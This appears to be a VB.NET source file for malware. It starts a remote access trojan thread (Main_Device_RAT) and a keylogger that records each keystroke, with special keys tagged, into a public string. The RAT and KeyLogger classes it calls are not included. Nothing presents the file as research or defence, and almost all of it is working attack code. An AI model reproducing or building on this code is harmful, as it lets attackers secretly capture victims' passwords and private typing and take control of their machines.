Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Net.Sockets

Module Main
    Public inputs As String = ""
    Public Sub Main()
        StartWorking()
        StartLogging()
    End Sub
    Public Work As Boolean = True
    Public Property Thread2 As Threading.Thread
    Public Sub StartWorking()
        Try
            Dim RAT As Main_Device_RAT
            RAT = New Main_Device_RAT
            Dim thread As New Threading.Thread(AddressOf RAT.Work)
            thread.Start()
        Catch ex As Exception
        End Try
    End Sub
    Public Sub StartLogging()
        Try
            Thread2 = New Threading.Thread(AddressOf Action)
            Thread2.Start()
        Catch ex As Exception
        End Try
    End Sub
    <DllImport("user32.dll")>
    Public Function GetAsyncKeyState(ByVal vKey As Keys) As Short
    End Function
    Public Sub Action()
        Dim Logger As New KeyLogger
        Logger.Start()
        AddHandler Logger.OnKeyPressed, AddressOf OnkeyPressed
    End Sub
    Public Sub OnkeyPressed(ByVal Key As Keys, ByVal Character As Char)
        Try
            If Key = Keys.Back Then
                inputs += "~BkSpc"
            ElseIf Key = Keys.Escape Then
                inputs += "~Esc"
            ElseIf Key = Keys.LControlKey Then
                inputs += "~LCtrl"
            ElseIf Key = Keys.RControlKey Then
                inputs += "~RCtrl"
            ElseIf Key = Keys.Tab Then
                inputs += "~Tab"
            ElseIf Key = Keys.Insert Then
                inputs += "~Insert"
            ElseIf Key = Keys.Delete Then
                inputs += "~Del"
            ElseIf Key = Keys.End Then
                inputs += "~End"
            ElseIf Key = Keys.LMenu Then
                inputs += "~LAlt"
            ElseIf Key = Keys.RMenu Then
                inputs += "~RAlt"
            ElseIf Key = Keys.LShiftKey Then
                inputs += "~Lshift"
            ElseIf Key = Keys.RShiftKey Then
                inputs += "~Rshift"
            ElseIf Key = Keys.Home Then
                inputs += "~Home"
            ElseIf Key = Keys.PageDown Then
                inputs += "~PD"
            ElseIf Key = Keys.PageUp Then
                inputs += "~PU"
            Else
                If Character <> Chr(0) And Character <> Chr(13) Then
                    inputs += Character
                End If
            End If
        Catch
        End Try
    End Sub
End Module
